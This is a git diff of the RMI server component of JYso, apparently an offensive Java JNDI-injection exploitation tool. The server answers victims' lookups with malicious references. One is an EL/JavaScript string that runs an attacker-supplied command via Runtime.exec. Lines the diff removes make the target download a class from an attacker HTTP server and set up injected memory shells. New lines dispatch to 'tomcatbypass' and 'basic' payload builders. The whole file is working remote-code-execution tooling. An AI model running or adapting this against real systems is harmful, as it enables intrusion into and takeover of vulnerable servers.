@@ -1,7 +1,8 @@
 package com.qi4l.JYso;
 
 
-import com.qi4l.JYso.gadgets.Config.Config;
+import com.qi4l.JYso.controllers.rmi.rmiBasic;
+import com.qi4l.JYso.controllers.rmi.rmiTomcatBypass;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.InjShell;
 import com.qi4l.JYso.gadgets.utils.Reflections;
@@ -9,6 +10,7 @@ import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
 import org.apache.naming.ResourceRef;
+import org.fusesource.jansi.Ansi;
 import sun.rmi.server.UnicastServerRef;
 import sun.rmi.transport.TransportConstants;
 
@@ -74,7 +76,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
                 "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
                         "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
                         ")",
-                Config.command
+                command
         )));
 
         return ref;
@@ -86,9 +88,6 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         System.err.println("Is DGC call for " + Arrays.toString((ObjID[]) ois.readObject()));
     }
 
-    /**
-     *
-     */
     public void close() {
         this.exit = true;
         try {
@@ -109,7 +108,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
                     try {
                         s.setSoTimeout(5000);
                         InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
-                        System.err.println("[+] Have connection from " + remote);
+                        //System.err.println("[+] Have connection from " + remote);
 
                         InputStream is    = s.getInputStream();
                         InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);
@@ -161,7 +160,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
                     } catch (Exception e) {
                         e.printStackTrace(System.err);
                     } finally {
-                        System.err.println("Closing connection");
+                        System.out.println(Ansi.ansi().fgRgb(255, 165, 0).a("  Closing connection").reset());
                         s.close();
                     }
 
@@ -183,7 +182,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
     }
 
     private void doMessage(Socket s, DataInputStream in, DataOutputStream out) throws Exception {
-        System.err.println("[+] RMI服务器 >> 正在读取信息");
+        //System.err.println("[+] RMI服务器 >> 正在读取信息");
 
         int op = in.read();
 
@@ -230,7 +229,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         ObjID read;
         try {
             read = ObjID.read(ois);
-        } catch (java.io.IOException e) {
+        } catch (IOException e) {
             throw new MarshalException(" RMI  服务器  >> 无法读取 ObjID", e);
         }
 
@@ -256,7 +255,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         }
 
         String object = (String) ois.readObject();
-        System.out.println(ansi().render("@|green [+]|@ RMI服务器 >> RMI 查询" + object + " " + method));
+        //System.out.println(ansi().render("@|green [+]|@ RMI服务器 >> RMI 查询" + object + " " + method));
         out.writeByte(TransportConstants.Return); // transport op
         try (ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl)) {
 
@@ -264,37 +263,15 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
             new UID().write(oos);
 
             //反射调用的类名
-            ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
+            ReferenceWrapper rw = null;
 
-            if (object.startsWith("Local")) {
-                System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 发送本地类加载引用"));
-                System.out.println("-------------------------------------- RMI Local  Refenrence Links --------------------------------------");
-                String[]    cmd       = object.split(" ");
-                final Class EchoClass = Class.forName(ClassNameHandler.searchClassByName(cmd[1]));
-                Reflections.setFieldValue(rw, "wrappee", EchoClass);
-            } else if (object.startsWith("E-")) {
-                String      object1    = object.substring(object.indexOf('-') + 1);
-                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(object1));
-                String      className  = EchoClass.getName();
-                String      className1 = className.replaceAll("\\.", "/");
-                String      turl       = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
-                String      classPath  = className + ".class";
-                System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 向目标发送 stub >> %s", turl));
-                System.out.println("-------------------------------------- RMI Remote Refenrence Links --------------------------------------");
-                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", classPath, turl));
-            } else if (object.startsWith("M-")) {
-                //M-EX-MS-RFMSFromThreadF-bx#params
-                String   object1 = object.substring(object.indexOf('-') + 1);
-                String[] parts   = object1.split("#");
-                String[] parts1  = parts[1].split(" ");
-                InjShell.init(parts1);
-                String className  = Gadgets.createClassB(parts[0]);
-                String className1 = className.replaceAll("\\.", "/");
-                String turl       = "http://" + ip + ":" + httpPort + "/" + className1 + ".class";
-                String className2 = className1.substring(className1.lastIndexOf('/') + 1);
-                System.out.println(ansi().render("@|green [+]|@ RMI 服务器  >> 向目标发送 stub >> %s", turl));
-                System.out.println("-------------------------------------- RMI Remote Refenrence Links --------------------------------------");
-                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", className2, turl));
+            if (object.startsWith("tomcatbypass")) {
+                ResourceRef result = rmiTomcatBypass.refTomcatBypass(object);
+                rw = new ReferenceWrapper(result);
+            } else if (object.startsWith("basic")) {
+                rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
+                Reference result = rmiBasic.basic(object);
+                Reflections.setFieldValue(rw, "wrappee", result);
             }
 
             Field refF = RemoteObject.class.getDeclaredField("ref");
